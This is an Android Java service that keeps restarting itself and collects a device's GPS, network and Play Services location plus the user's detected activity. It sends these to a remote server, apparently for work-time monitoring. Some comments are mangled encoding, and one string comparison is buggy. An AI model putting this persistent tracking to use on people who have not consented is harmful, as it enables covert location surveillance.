package com.inet.android.location;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.GpsSatellite;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesClient;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.location.LocationClient;
import com.google.android.gms.location.LocationRequest;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

/**
 * LocationTracker class is designed to monitoring location
 * 
 * @author johny homicide
 * 
 */
public class LocationTracker extends Service implements GpsStatus.Listener,
		LocationListener, GooglePlayServicesClient.ConnectionCallbacks,
		GooglePlayServicesClient.OnConnectionFailedListener,
		com.google.android.gms.location.LocationListener {

	private static final String TAG = "locationService";
	private LocationValue locationValue;;
	private ConvertDate date;
	private static final int SERVICE_REQUEST_CODE = 15;
	// The minimum distance to change Updates in meters
	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 30; // 100
	// A fast frequency ceiling in milliseconds
	// Milliseconds per second
	private static final int MILLISECONDS_PER_SECOND = 1000;
	// Milliseconds per second
	private static final int MILLISECONDS_PER_MINUTE = 60 * MILLISECONDS_PER_SECOND;
	// Update frequency in seconds
	public static final int UPDATE_INTERVAL_IN_SECONDS = 5;
	// Update frequency in milliseconds
	private static final long UPDATE_INTERVAL = MILLISECONDS_PER_MINUTE
			* UPDATE_INTERVAL_IN_SECONDS;

	// The minimum time between updates in milliseconds
	private static long MIN_TIME_BW_UPDATES; // get minute
	// Declaring a Location Manager
	protected LocationManager locationManager;
	private LocationClient mLocationClient;
	private LocationRequest mLocationRequest;

	// flag for GPS status
	private boolean isGPSEnabled = false;
	private SharedPreferences sp;
	// flag for network status
	private boolean isNetworkEnabled = false;
	// flag for GPS status
	private boolean canGetLocation = false;
	private Context mContext;
	private Location location; // location
	private String geoMode = null;

	@Override
	public void onCreate() {
		Logging.doLog(TAG, "onCreate() GPS", "onCreate() GPS");
		mContext = getApplicationContext();

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		mContext = getApplicationContext();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		int timeUp = Integer.parseInt(sp.getString("geo", "5"));
		geoMode = sp.getString("geo_mode", "1");
		locationManager = (LocationManager) mContext
				.getSystemService(LOCATION_SERVICE);
		// ----------get geo time
		// ---------------------------------------------------
		Logging.doLog(TAG, "onStartCommand gpsTracker",
				"onStartCommand gpsTracker");
		if (sp.getString("geo", "5").equals("0")) {
			Logging.doLog(TAG, "Location Stop", "Location Stop");
			stopLocationManager();
			stopPlayService();
			return 0;
		}
		MIN_TIME_BW_UPDATES = timeUp * MILLISECONDS_PER_MINUTE;
		Logging.doLog(TAG, "onStartCommand LocationTracker "
				+ MIN_TIME_BW_UPDATES, "onStartCommand LocationTracker "
				+ MIN_TIME_BW_UPDATES);

		// ----------restart service
		// ---------------------------------------------------

		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, timeUp);// ����� 5 �����
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, LocationTracker.class),// SERVICE_REQUEST_CODE
																				// -
																				// ����������
																				// int
																				// �������
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
		// ----------is work ---------------------------------------------------

		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));
			return 0;
		} else {
			Logging.doLog(TAG, Boolean.toString(isWork),
					Boolean.toString(isWork));

		}
		date = new ConvertDate();
		locationValue = new LocationValue();

		if (!servicesAvailable()) {
			stopPlayService();
			setOnLocationManager();

		} else {
			stopLocationManager();
			mLocationRequest = LocationRequest.create()
					.setInterval(MIN_TIME_BW_UPDATES)
					.setFastestInterval(MILLISECONDS_PER_MINUTE);
			Logging.doLog(TAG, "geomode setPrioity" + geoMode,
					"geomode setPrioity" + geoMode);
			if (geoMode.equals("1"))
				mLocationRequest
						.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
			else
				mLocationRequest
						.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);

			mLocationClient = new LocationClient(this, this, this);
			mLocationClient.connect();
			Logging.doLog(TAG, "connect locationClient",
					"connect locationClient");

		}
		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	private Location setOnLocationManager() {
		try {
			Logging.doLog(TAG, "GetLocation ", "GetLocation ");

			// --------------- getting GPS
			// status-------------------------------------------
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);

			// --------------- getting network
			// status--------------------------------------
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

			// --------------- getting geo_mode
			// --------------------------------------------

			if ((geoMode.equals("1")) && isGPSEnabled && !servicesAvailable()) {

				locationValue.setGPSLocation(true);
				Logging.doLog(TAG, "GPS set true ", "GPS set true ");

			} else {
				Logging.doLog(TAG,
						"GPS set false " + sp.getString("geo_mode", "1"),
						"GPS set false " + sp.getString("geo_mode", "1"));
				locationValue.setGPSLocation(false);
				locationManager.removeGpsStatusListener(this);
			}
			// --------------- getting location
			// method---------------------------------------

			if (!isGPSEnabled && !locationValue.getGPSLocation()) {
				// no network provider is enabled
				Logging.doLog(TAG, "!isGPS&&isNetwork ", "!isGPS&&isNetwork ");
				return null;
			} else {
				this.canGetLocation = true;
				// if Network Enabled get lat/long using GPS Services
				if (isOnline() == true) {
					Logging.doLog(TAG, "Network isOnline ", "Network isOnline ");
					if (isNetworkEnabled == true) {
						netLoc();
					}
				}
				if (locationValue.getGPSLocation() == true) {
					Logging.doLog(TAG, "GPS Enabled", "GPS Enabled");
					locationManager.addGpsStatusListener(this);
					gpsLoc();
				}
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		getLast();

		return location;
	}

	// -----------------search last coordinates-----------------------

	private void getLast() {
		SimpleDateFormat TIMESTAMP = new SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss", Locale.getDefault());
		Location bestResult = null;
		String bestProvider = null;
		double latitude = 0; // latitude
		double longitude = 0; // longitude

		float accuracy;
		long time;
		long bestTime = 0;
		float bestAccuracy = 1000;
		long minTime = 0;
		List<String> matchingProviders = locationManager.getAllProviders();
		matchingProviders.add("GooglePlayService");
		Logging.doLog(TAG, "LocMan " + matchingProviders.toString(), "LocMan "
				+ matchingProviders.toString());

		for (String provider : matchingProviders) {
			if (provider.equals("GooglePlayService"))
				if (mLocationClient != null && locationValue.isLocationClient())
					location = mLocationClient.getLastLocation();
				else
					location = locationManager.getLastKnownLocation(provider);

			if (location != null) {

				accuracy = location.getAccuracy();
				time = location.getTime();

				// ������� ���� �� �������
				String date2 = TIMESTAMP.format(time);
				Logging.doLog(TAG, "last update " + provider + " " + date2
						+ " accuracy" + accuracy, "last update " + provider
						+ " " + date2 + " accuracy" + accuracy);
				long timeSys = System.currentTimeMillis();
				minTime = timeSys - UPDATE_INTERVAL;
				if ((time > minTime && accuracy < bestAccuracy)) {
					bestResult = location;
					longitude = bestResult.getLongitude();
					latitude = bestResult.getLatitude();
					bestAccuracy = accuracy;
					bestTime = time;
					bestProvider = provider;
				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE
						&& time > bestTime) {
					bestResult = location;
					bestTime = time;
					bestProvider = provider;
					bestAccuracy = accuracy;
					longitude = bestResult.getLongitude();
					latitude = bestResult.getLatitude();
				}
			}

		}
		Logging.doLog(TAG, "bestProvider " + bestProvider + " best time: "
				+ bestTime + " best accuracy " + bestAccuracy, "bestProvider "
				+ bestProvider + " best accuracy" + bestAccuracy);

		locationValue.setProvider(bestProvider);
		locationValue.setLatitude(latitude);
		locationValue.setLongitude(longitude);
		locationValue.setAccuracy(bestAccuracy);
		sendLoc();

	}

	public boolean isOnline() {
		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo = cm.getActiveNetworkInfo();
		if (netInfo != null && netInfo.isConnectedOrConnecting()) {
			return true;
		}
		return false;
	}

	private void netLoc() {
		// locMetod = "network";
		locationManager.requestLocationUpdates(
				LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
	}

	private void gpsLoc() {
		// locMetod = "network";
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
				MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
	}

	private void sendLoc() {
		if (Double.toString(locationValue.getLatitude()) == "0.0"
				&& Double.toString(locationValue.getLongitude()) == "0.0") {
			Logging.doLog(TAG, "equals = 0.0", "equals = 0.0");

		} else {
			String type = "9";

			// -------send location----------------------------
			String sendJSONStr = null;
			JSONObject info = new JSONObject();
			JSONObject object = new JSONObject();
			try {
				// String activity = sp.getString("activity", "0");
				String activity = RecognitionDevService.getActivityDevice();
				Logging.doLog(TAG, "activity" + activity, "activity" + activity);

				if (activity != null && !activity.equals(""))
					info.put("ttl", locationValue.getProvider() + " " + " "
							+ activity);
				else
					info.put("ttl", locationValue.getProvider());
				info.put("data", locationValue.getLatitude() + ","
						+ locationValue.getLongitude());
				info.put("accuracy",
						String.format("%.02f", locationValue.getAccuracy()));
				object.put("time", date.logTime());
				object.put("type", type);
				object.put("info", info);

				sendJSONStr = object.toString();
			} catch (JSONException e) {
				Logging.doLog(TAG, "json ��������", "json ��������");
			}

			DataRequest dr = new DataRequest(mContext);
			dr.sendRequest(sendJSONStr);

			Logging.doLog(TAG, sendJSONStr, sendJSONStr);
		}
	}

	/**
	 * Function to show settings alert dialog On pressing Settings button will
	 * lauch Settings Options
	 * */

	@Override
	public void onLocationChanged(Location location) {
		if (location != null) {
			if (location.getProvider().equals("fused"))
				locationValue.setProvider("GooglePlayService");
			else
				locationValue.setProvider(location.getProvider());
			locationValue.setLatitude(location.getLatitude());
			locationValue.setLongitude(location.getLongitude());
			locationValue.setAccuracy(location.getAccuracy());
		}

	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		/* This is called when the GPS status alters */
		switch (status) {
		case LocationProvider.OUT_OF_SERVICE:
			Logging.doLog(TAG, "Status Changed: Out of Service",
					"Status Changed: Out of Service");

			break;
		case LocationProvider.TEMPORARILY_UNAVAILABLE:
			Logging.doLog(TAG, "Status Changed: Temporarily Unavailable",
					"Status Changed: Temporarily Unavailable");

			break;
		case LocationProvider.AVAILABLE:
			Logging.doLog(TAG, "Status Changed: Available",
					"Status Changed: Available");
			break;
		}
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onGpsStatusChanged(int event) {
		// TODO ������������� ��������� �������� ������
		GpsStatus status = locationManager.getGpsStatus(null);

		switch (event) {
		case GpsStatus.GPS_EVENT_FIRST_FIX:
			Logging.doLog(TAG, "GPS_EVENT_FIRST_FIX", "GPS_EVENT_FIRST_FIX");
			if (status.getTimeToFirstFix() < 1000 * 20)
				locationValue.setGPSFix(true);
			else
				return;
			break;
		case GpsStatus.GPS_EVENT_SATELLITE_STATUS:
			if (locationValue.getGPSFix() == true) {
				Logging.doLog(TAG, "GPS_EVENT_SATELLITE_STATUS",
						"GPS_EVENT_SATELLITE_STATUS");

				Iterable<GpsSatellite> satellites = status.getSatellites();

				Iterator<GpsSatellite> sats = satellites.iterator();
				int i = 0;

				while (sats.hasNext()) {
					sats.next();
					i += 1;
				}
				locationValue.setSatsAvailable(i);
				Logging.doLog(TAG,
						Integer.toString(locationValue.getSatsAvailable()),
						Integer.toString(locationValue.getSatsAvailable()));

				if (locationValue.getSatsAvailable() >= 4) {
					Logging.doLog(TAG, "Sats >= 4", "Sats >= 4");
					locationValue.setGPSLoc(true);
				}
			}
			break;
		case GpsStatus.GPS_EVENT_STARTED:
			Logging.doLog(TAG, "GPS_EVENT_STARTED", "GPS_EVENT_STARTED");

			break;
		case GpsStatus.GPS_EVENT_STOPPED:
			Logging.doLog(TAG, "GPS_EVENT_STOPPED", "GPS_EVENT_STOPPED");
			locationValue.setGPSFix(false);
			break;
		}
	}

	@Override
	public void onConnectionFailed(ConnectionResult connectionResult) {
		// TODO Auto-generated method stub
		locationValue.setLocationClient(false);

	}

	@Override
	public void onConnected(Bundle arg0) {
		// TODO Auto-generated method stub
		Log.d(TAG, "Connected to Google Play Services.");
		// Location lastLocation = mLocationClient.getLastLocation();
		// Log.d(TAG, "Last location is: "
		// + (lastLocation == null ? "null" : Utils.format(lastLocation)));
		mLocationClient.requestLocationUpdates(mLocationRequest, this);
		locationValue.setLocationClient(true);

		getLast();

	}

	@Override
	public void onDisconnected() {
		// TODO Auto-generated method stub
		locationValue.setLocationClient(false);

	}

	private boolean servicesAvailable() {
		int resultCode = GooglePlayServicesUtil
				.isGooglePlayServicesAvailable(this);
		if (ConnectionResult.SUCCESS == resultCode) {
			Log.d(TAG, "Google Play services is available.");
			return true;
		}
		Log.e(TAG, "Google Play services NOT available.");
		return false;
	}

	private void stopPlayService() {
		Log.d(TAG, "stopPlayService()");

		if (mLocationClient != null && mLocationClient.isConnected()) {
			locationValue.setLocationClient(false);

			mLocationClient.removeLocationUpdates(this);
			mLocationClient.disconnect();
		}
	}

	private void stopLocationManager() {
		if (locationManager != null) {
			locationManager.removeUpdates(this);
			locationManager.removeGpsStatusListener(this);
		}
	}
}
